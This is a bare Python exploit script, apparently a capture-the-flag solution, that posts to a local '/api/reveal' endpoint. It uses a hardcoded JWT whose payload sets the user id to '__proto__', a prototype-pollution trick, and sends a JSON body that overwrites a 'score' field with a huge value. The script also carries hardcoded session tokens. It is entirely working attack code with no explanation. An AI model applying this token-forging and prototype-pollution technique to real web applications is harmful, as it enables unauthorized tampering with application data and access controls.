import requests

cookies = {
    'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiX19wcm90b19fIiwiaWF0IjoxNzUyMTk4MDIwfQ.U-BQBE_nN89GvG3NgUmvIoeLl8Zyrtv6oqyrmOOccj4'
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'http://localhost:28576',
    'Referer': 'http://localhost:28576/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': 'connect.sid=s%3ACMLxIZ4XFt4zX5SCfCvphn_6aho5Hqsr.KI9CJJnxCoCeSCy%2BJdlvCJy35yAwVbdcnFjklTFNInA',
}

json_data = {
    'row': "score",
    'col': "",
    'value': 99999999999999,
}

response = requests.post('http://localhost:9999/api/reveal', cookies=cookies, headers=headers, json=json_data)
print(response.text)